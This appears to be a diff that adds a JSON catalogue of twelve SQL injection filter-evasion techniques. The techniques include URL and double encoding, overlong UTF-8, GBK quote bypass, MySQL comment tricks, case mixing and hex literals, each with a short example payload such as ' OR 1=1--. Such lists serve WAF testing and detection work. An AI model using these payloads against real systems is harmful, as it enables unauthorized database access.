@@ -1,0 +1,75 @@
+[
+  {
+    "id": "TRANS-01",
+    "name": "Standard URL Percent Encoding",
+    "example": "%27%20OR%201%3D1--%20",
+    "evidence": "E5"
+  },
+  {
+    "id": "TRANS-02",
+    "name": "Double URL Encoding",
+    "example": "%2527%2520OR%25201%253D1",
+    "evidence": "E5"
+  },
+  {
+    "id": "TRANS-03",
+    "name": "Unicode Overlong UTF-8",
+    "example": "%C0%A7",
+    "evidence": "E4"
+  },
+  {
+    "id": "TRANS-04",
+    "name": "Multibyte Charset Mismatch (GBK)",
+    "example": "%bf%27",
+    "evidence": "E5"
+  },
+  {
+    "id": "TRANS-05",
+    "name": "Whitespace Control Byte Substitution",
+    "example": "%09, %0a, %0c, %0d",
+    "evidence": "E5"
+  },
+  {
+    "id": "TRANS-06",
+    "name": "Inline SQL Comment Insertion",
+    "example": "UNION/**/SELECT/**/1,2",
+    "evidence": "E5"
+  },
+  {
+    "id": "TRANS-07",
+    "name": "Version-Specific MySQL Comments",
+    "example": "/*!50000SELECT*/",
+    "evidence": "E5"
+  },
+  {
+    "id": "TRANS-08",
+    "name": "Case Sensitivity Manipulation",
+    "example": "uNiOn/**/SeLeCt",
+    "evidence": "E5"
+  },
+  {
+    "id": "TRANS-09",
+    "name": "JSON Unicode Escape Sequences",
+    "example": "\\u0027 OR 1=1--",
+    "evidence": "E5"
+  },
+  {
+    "id": "TRANS-10",
+    "name": "XML Entity Character References",
+    "example": "&apos; OR 1=1--",
+    "evidence": "E5"
+  },
+  {
+    "id": "TRANS-11",
+    "name": "Null-Byte String Truncation (Historical)",
+    "example": "admin%00' OR '1'='1",
+    "evidence": "E4",
+    "status": "HISTORICAL"
+  },
+  {
+    "id": "TRANS-12",
+    "name": "Hexadecimal & Scientific Literals",
+    "example": "0x61646d696e, 1e0",
+    "evidence": "E5"
+  }
+]
